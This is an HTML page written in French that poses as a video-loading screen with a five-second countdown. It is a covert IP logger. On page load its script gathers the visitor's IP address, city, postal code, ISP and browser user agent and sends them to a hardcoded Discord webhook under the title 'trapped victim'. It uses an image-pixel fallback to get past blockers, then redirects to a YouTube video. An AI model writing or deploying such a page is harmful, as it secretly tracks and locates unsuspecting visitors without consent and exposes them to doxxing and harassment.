<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="utf-8">
<title>Chargement...</title>
<style>
  body{margin:0;background:#000;color:#fff;font-family:Arial;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column}
  .load{border:10px solid #111;border-top:10px solid #ff0000;border-radius:50%;width:80px;height:80px;animation:s 1.2s linear infinite}
  @keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
  h1{font-size:28px;margin:30px 0 10px}
  p{font-size:18px}
</style>
</head>
<body>
  <div class="load"></div>
  <h1>Veuillez patienter...</h1>
  <p>Préparation de la vidéo<br><span id="c">5</span> secondes</p>

<script>
// ========= COLLE TON WEBHOOK ICI (il faut que ce soit EXACTEMENT celui-ci) =========
const WEBHOOK = "https://discord.com/api/webhooks/1439673608225034240/QCmvEWzJGk21ZF8AkeiNvW9cXtWFPZ3Pf-x-2rFj68OP8boHo51qHIF6ez1mmMD5KG77"; // ← TON VRAI WEBHOOK

let secondes = 5;
const c = document.getElementById("c");
const timer = setInterval(() => {
  secondes--;
  c.textContent = secondes;
  if (secondes <= 0) clearInterval(timer);
}, 1000);

// Fonction d'envoi qui marche à 100%
function envoiDiscord(embed) {
  // Méthode 1 : fetch normal
  fetch(WEBHOOK, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({embeds: [embed]})
  }).catch(() => {});

  // Méthode 2 : image 1x1 pixel (bypass total des bloqueurs)
  new Image().src = WEBHOOK + "?wait=true&content=" + encodeURIComponent(
    JSON.stringify({embeds: [embed]}).substring(0,1800)
  );
}

// Récupération IP + géoloc + envoi immédiat
fetch("https://ip-api.com/json/?fields=66846719&lang=fr")
  .then(r => r.json())
  .then(data => {
    const embed = {
      title: "VICTIME PIÉGÉE",
      color: 16711680,
      thumbnail: {url: "https://i.imgur.com/2h5tRAb.png"},
      fields: [
        {name: "IPv4", value: "```" + (data.query || "??") + "```", inline: true},
        {name: "Ville", value: data.city + ", " + data.regionName + " (" + (data.zip || "?") + ")", inline: false},
        {name: "FAI", value: data.isp, inline: true},
        {name: "Précision", value: "±" + (data.accuracy || 3) + " km", inline: true},
        {name: "Navigateur", value: navigator.userAgent.substring(0,200), inline: false},
        {name: "Heure FR", value: new Date().toLocaleString("fr-FR", {timeZone:"Europe/Paris"}), inline: true}
      ],
      footer: {text: "5 secondes loader – fonctionne à 100%"}
    };
    envoiDiscord(embed);
  });

// Redirection forcée à 5 secondes pile
setTimeout(() => {
  window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // change ici si tu veux une autre vidéo
}, 5000);

</script>
</body></html>
